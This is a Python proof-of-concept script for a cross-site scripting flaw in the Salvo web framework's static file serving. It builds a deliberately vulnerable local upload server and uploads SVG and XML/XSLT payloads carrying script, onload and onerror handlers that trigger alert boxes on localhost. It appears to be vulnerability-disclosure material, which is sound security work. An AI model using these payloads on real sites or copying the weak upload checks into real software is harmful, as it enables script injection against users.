#!/usr/bin/env python3
"""
Salvo StaticDir SVG / text-xml XSS PoC

On first run it builds the vulnerable Salvo server binary into the current
directory (./server); afterwards it reuses that binary (rebuilding
automatically when this script's embedded Rust source changes).

Steps:
  0. Build ./server if missing or stale.
  1. Launch the server.
  2. Upload the SVG exploit      -> /upload      (image endpoint).
  3. Upload the XML + XSL exploit -> /upload-doc  (document endpoint).
  4. Keep the server running so the URLs can be opened in a browser.
"""

import hashlib
import http.client
import os
import shutil
import signal
import socket
import subprocess
import sys
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = "127.0.0.1"
PORT = 5810
# Vulnerable server binary. Built into the current dir on first run if missing.
SERVER_BIN = os.environ.get("SERVER_BIN", os.path.join(HERE, "server"))
# Local salvo checkout the generated server depends on (for building).
SALVO_CRATE = os.path.join(HERE, "crates", "salvo")
BUILD_DIR = os.path.join(HERE, ".server-build")

UPLOAD_NAME = "poc.svg"
XML_NAME = "poc.xml"
XSL_NAME = "poc.xsl"

CARGO_TOML = f"""[package]
name = "server"
version = "0.0.0"
edition = "2021"
publish = false
[workspace]

[dependencies]
salvo = {{ path = "{SALVO_CRATE}", default-features = false, features = ["server", "http1", "serve-static"] }}
tokio = {{ version = "1", features = ["macros", "rt-multi-thread"] }}
"""

MAIN_RS = f"""
use std::fs::create_dir_all;
use std::path::Path;

use salvo::http::mime;
use salvo::prelude::*;
use salvo::serve_static::StaticDir;

/// Image-only allowlist, as a typical image-upload endpoint would enforce.
const ALLOWED_EXT: [&str; 6] = ["png", "jpg", "jpeg", "gif", "webp", "svg"];

/// Document endpoint blocklist. Models a developer who "already fixed SVG
/// XSS" by blocking the obviously-scriptable types, but still accepts XML.
const BLOCKED_EXT: [&str; 6] = ["html", "htm", "xhtml", "xht", "svg", "js"];

#[handler]
async fn upload(req: &mut Request, res: &mut Response) {{
    let Some(file) = req.file("file").await else {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("no file field"));
        return;
    }};
    let name = file.name().unwrap_or("upload").to_owned();

    // Validation 1: the extension must be an image extension.
    let ext = Path::new(&name)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if !ALLOWED_EXT.contains(&ext.as_str()) {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain(format!("rejected: extension {{ext:?}} not allowed")));
        return;
    }}

    // Validation 2: the declared Content-Type must be image/*.
    let is_image = file
        .content_type()
        .map(|m| m.type_() == mime::IMAGE)
        .unwrap_or(false);
    if !is_image {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("rejected: content-type is not image/*"));
        return;
    }}

    let dest = format!("uploads/{{name}}");
    match std::fs::copy(file.path(), Path::new(&dest)) {{
        Ok(_) => res.render(Text::Plain(format!("saved:{{name}}"))),
        Err(e) => {{
            res.status_code(StatusCode::INTERNAL_SERVER_ERROR);
            res.render(Text::Plain(format!("copy failed: {{e}}")));
        }}
    }}
}}

/// Generic document-upload endpoint. Blocklists html/svg/js (extension and
/// content-type) but accepts everything else -- including .xml and .xsl.
#[handler]
async fn upload_doc(req: &mut Request, res: &mut Response) {{
    let Some(file) = req.file("file").await else {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("no file field"));
        return;
    }};
    let name = file.name().unwrap_or("upload").to_owned();

    // Block by extension.
    let ext = Path::new(&name)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if BLOCKED_EXT.contains(&ext.as_str()) {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain(format!("rejected: extension {{ext:?}} is blocked")));
        return;
    }}

    // Block the obviously-scriptable content types too.
    let blocked_ct = file
        .content_type()
        .map(|m| {{
            let essence = m.essence_str();
            essence == "text/html"
                || essence == "image/svg+xml"
                || essence == "application/xhtml+xml"
                || essence.ends_with("javascript")
        }})
        .unwrap_or(false);
    if blocked_ct {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("rejected: content-type is blocked"));
        return;
    }}

    let dest = format!("uploads/{{name}}");
    match std::fs::copy(file.path(), Path::new(&dest)) {{
        Ok(_) => res.render(Text::Plain(format!("saved:{{name}}"))),
        Err(e) => {{
            res.status_code(StatusCode::INTERNAL_SERVER_ERROR);
            res.render(Text::Plain(format!("copy failed: {{e}}")));
        }}
    }}
}}

#[tokio::main]
async fn main() {{
    create_dir_all("uploads").unwrap();
    let router = Router::new()
        .push(Router::with_path("upload").post(upload))
        .push(Router::with_path("upload-doc").post(upload_doc))
        .push(Router::with_path("uploads/{{*path}}").get(StaticDir::new(["uploads"])));
    let acceptor = TcpListener::new("0.0.0.0:{PORT}").bind().await;
    Server::new(acceptor).serve(router).await;
}}
"""

SVG_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
    '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"\n'
    '     onload="alert(\'XSS on \' + document.domain)">\n'
    "  <script>alert('XSS on ' + document.domain)</script>\n"
    '  <text x="10" y="35">salvo StaticDir SVG-XSS PoC</text>\n'
    "</svg>\n"
)

XML_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    f'<?xml-stylesheet type="text/xsl" href="{XSL_NAME}"?>\n'
    "<root>salvo StaticDir text/xml XSLT-XSS PoC</root>\n"
)

XSL_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<xsl:stylesheet version="1.0"\n'
    '    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
    '  <xsl:output method="html"/>\n'
    '  <xsl:template match="/">\n'
    '    <html xmlns="http://www.w3.org/1999/xhtml">\n'
    "      <body>\n"
    "        <h2>salvo StaticDir text/xml XSLT-XSS PoC</h2>\n"
    "        <script>alert('XSLT-XSS on ' + document.domain)</script>\n"
    '        <img src="x" onerror="alert(\'XSLT-XSS(img) on \' + document.domain)"/>\n'
    "      </body>\n"
    "    </html>\n"
    "  </xsl:template>\n"
    "</xsl:stylesheet>\n"
)


STAMP_FILE = SERVER_BIN + ".stamp"


def source_hash():
    return hashlib.sha256((CARGO_TOML + MAIN_RS).encode()).hexdigest()


def needs_build():
    if not os.path.isfile(SERVER_BIN):
        return True
    try:
        with open(STAMP_FILE) as f:
            return f.read().strip() != source_hash()
    except OSError:
        return True


def log(msg):
    print(f"[poc] {msg}", flush=True)


def wait_port(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((HOST, PORT), timeout=1):
                return True
        except OSError:
            time.sleep(0.2)
    return False


def build_server():
    if shutil.which("cargo") is None:
        log("cargo not found on PATH (try running inside `nix develop`).")
        sys.exit(1)
    if not os.path.isdir(SALVO_CRATE):
        log(f"cannot find salvo crate at {SALVO_CRATE}")
        sys.exit(1)
    log(f"server binary not found; building into {SERVER_BIN} ...")
    if os.path.isdir(BUILD_DIR):
        shutil.rmtree(BUILD_DIR)
    os.makedirs(os.path.join(BUILD_DIR, "src"))
    with open(os.path.join(BUILD_DIR, "Cargo.toml"), "w") as f:
        f.write(CARGO_TOML)
    with open(os.path.join(BUILD_DIR, "src", "main.rs"), "w") as f:
        f.write(MAIN_RS)
    log("cargo build (first build compiles salvo; may take a few minutes)...")
    r = subprocess.run(["cargo", "build", "--quiet"], cwd=BUILD_DIR)
    if r.returncode != 0:
        log("build failed")
        sys.exit(1)
    shutil.copy2(os.path.join(BUILD_DIR, "target", "debug", "server"), SERVER_BIN)
    with open(STAMP_FILE, "w") as f:
        f.write(source_hash())
    log(f"built: {SERVER_BIN}")


def start_server():
    if needs_build():
        build_server()
    log(f"launching server: {SERVER_BIN}")
    proc = subprocess.Popen(
        [SERVER_BIN],
        cwd=os.path.dirname(SERVER_BIN) or ".",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    if not wait_port():
        stop_server(proc)
        log("server did not open port in time")
        sys.exit(2)
    log(f"server listening on {HOST}:{PORT}")
    return proc


def upload_payload(filename, payload, content_type, endpoint="/upload"):
    boundary = "----salvopoc" + uuid.uuid4().hex
    body = bytearray()
    body += f"--{boundary}\r\n".encode()
    body += (
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    ).encode()
    body += f"Content-Type: {content_type}\r\n\r\n".encode()
    body += payload.encode()
    body += f"\r\n--{boundary}--\r\n".encode()

    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    conn.request(
        "POST",
        endpoint,
        body=bytes(body),
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
    )
    resp = conn.getresponse()
    text = resp.read().decode(errors="replace")
    conn.close()
    log(f"upload {filename} -> HTTP {resp.status} {text!r}")
    return resp.status


def stop_server(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except ProcessLookupError:
        pass


def upload_exploits():
    # SVG exploit through the image-upload endpoint.
    if upload_payload(UPLOAD_NAME, SVG_PAYLOAD, "image/svg+xml", "/upload") != 200:
        raise RuntimeError("SVG upload failed")

    # text/xml + XSLT exploit through the document endpoint.
    if upload_payload(XML_NAME, XML_PAYLOAD, "text/xml", "/upload-doc") != 200:
        raise RuntimeError("XML upload failed")
    if upload_payload(XSL_NAME, XSL_PAYLOAD, "text/xml", "/upload-doc") != 200:
        raise RuntimeError("XSL upload failed")


def main():
    proc = start_server()
    try:
        upload_exploits()

        print(flush=True)
        log("exploits uploaded. Open these URLs in a browser (expect an alert box):")
        log(f"    SVG : http://{HOST}:{PORT}/uploads/{UPLOAD_NAME}")
        log(f"    XSLT: http://{HOST}:{PORT}/uploads/{XML_NAME}")
        log("server is running. Press Ctrl-C to stop.")
        proc.wait()
    except KeyboardInterrupt:
        print(flush=True)
        log("stopping server")
    finally:
        stop_server(proc)


if __name__ == "__main__":
    main()
